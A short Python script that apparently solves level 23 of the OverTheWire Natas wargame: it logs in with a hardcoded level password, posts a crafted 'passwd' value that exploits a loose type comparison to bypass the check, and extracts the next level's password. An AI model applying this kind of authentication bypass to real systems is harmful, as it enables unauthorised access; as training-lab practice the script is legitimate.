import requests
import re

username = "natas23"
password = "CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5"
url = 'http://%s.natas.labs.overthewire.org/' % username

payload = {"passwd":"3000iloveyou"}
session = requests.session()
response = session.post(url, auth=(username,password), data=payload)

#print(response.text)
print (re.findall("Password: (.*)</pre>",response.text)[0])
